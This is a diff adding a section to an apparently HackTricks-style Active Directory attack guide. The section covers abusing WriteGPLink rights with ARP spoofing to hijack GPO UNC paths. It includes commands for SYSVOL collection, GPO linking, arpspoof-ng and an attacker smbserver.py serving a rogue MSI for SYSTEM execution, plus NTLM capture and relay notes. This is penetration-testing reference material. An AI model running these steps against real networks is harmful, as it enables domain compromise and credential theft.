@@ -261,6 +261,67 @@ The XML configuration file for Users and Groups outlines how these changes are i
 
 Furthermore, additional methods for executing code or maintaining persistence, such as leveraging logon/logoff scripts, modifying registry keys for autoruns, installing software via .msi files, or editing service configurations, can also be considered. These techniques provide various avenues for maintaining access and controlling target systems through the abuse of GPOs.
 
+### WriteGPLink + UNC path hijacking (ARP spoofing)
+
+`WriteGPLink` over an OU/domain lets you modify the target container's `gPLink` attribute and **force an existing GPO to apply** without editing the GPO itself. This becomes interesting when the linked GPO already references remote content over **UNC paths** (`\\HOST\share\...`), because authenticated users can read **SYSVOL** and hunt for reusable policies offline.
+
+High-level workflow:
+
+1. Use BloodHound to identify a principal with `WriteGPLink` over an OU and enumerate computers/users inside that OU.
+2. Clone `SYSVOL` read-only and parse GPOs looking for **Software Installation**, **drive mappings** (`Drives.xml`), and **logon/startup scripts** that reference UNC paths.
+3. Prefer policies pointing to a **direct hostname** (for example `\\DC02\share\pkg.msi`) instead of DFS/domain-namespace paths, because hostname-based paths are easier to redirect with L2 spoofing.
+4. Append the chosen GPO GUID to the target OU's `gPLink` so the victim processes that already-existing policy.
+5. On the same broadcast domain, ARP spoof the UNC host and bind its IP locally (`ip addr add <target_ip>/32 dev <iface>`) so the victim's SMB traffic reaches your host.
+6. Serve the expected path/filename from an attacker SMB server (for example `smbserver.py`) and wait for normal policy processing.
+
+Example `SYSVOL` collection and GPO correlation:
+
+```bash
+mkdir -p /mnt/$DOMAIN/SYSVOL/
+mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
+rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
+python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
+python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
+python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
+```
+
+Link the existing GPO to the target OU:
+
+```bash
+python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
+  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
+```
+
+#### Software Installation UNC hijack -> SYSTEM
+
+If the linked GPO deploys an MSI from a UNC path, the client will fetch it during **computer startup** and install it as **`NT AUTHORITY\SYSTEM`**. By spoofing the referenced host and serving a malicious MSI under the **same share/path/name**, you can turn `WriteGPLink` into SYSTEM code execution **without modifying SYSVOL**.
+
+Important constraints:
+
+- **Timing matters**: the new link is seen at policy refresh (commonly ~90 minutes), but **Software Installation** usually triggers on **reboot**.
+- Windows Installer commonly tracks the deployment using the package **`ProductCode`**. If the product is already installed, deployment may be skipped.
+- To avoid installer rejection, patch the rogue MSI so its **`ProductCode`** and **`PackageCode`** match the legitimate package expected by the GPO.
+- Old `.aas` advertisement files may remain in `SYSVOL`, so validate that the deployment still looks active before relying on it.
+
+```bash
+ip addr add <unc_host_ip>/32 dev <iface>
+arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
+smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
+```
+
+#### Drive-map UNC hijack -> NTLM capture / WebDAV relay
+
+GPP drive mappings in `Drives.xml` cause users to authenticate to the configured UNC path during logon or reconnection. If you spoof the referenced host, you can capture **NetNTLMv2**. If SMB is deliberately made to fail, Windows may retry over **WebDAV**, sending **NTLM over HTTP**, which is far more flexible for relays to **LDAP(S)**, **AD CS**, or **SMB**.
+
+#### Logon/startup script UNC hijack
+
+The same pattern applies to UNC-hosted scripts discovered in `SYSVOL`:
+
+- **Logon scripts** usually execute in the **user** context.
+- **Startup scripts** usually execute in the **computer / SYSTEM** context.
+
+If the script path points to a spoofable hostname, redirect the UNC host and serve replacement script content from the expected location.
+
 ## SYSVOL/NETLOGON Logon Script Poisoning
 
 Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.
@@ -339,7 +400,7 @@ Notes:
 - [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
 - [Samba – net rpc (group membership)](https://www.samba.org/)
 - [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
+- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
 
 {{#include ../../../banners/hacktricks-training.md}}
-
 
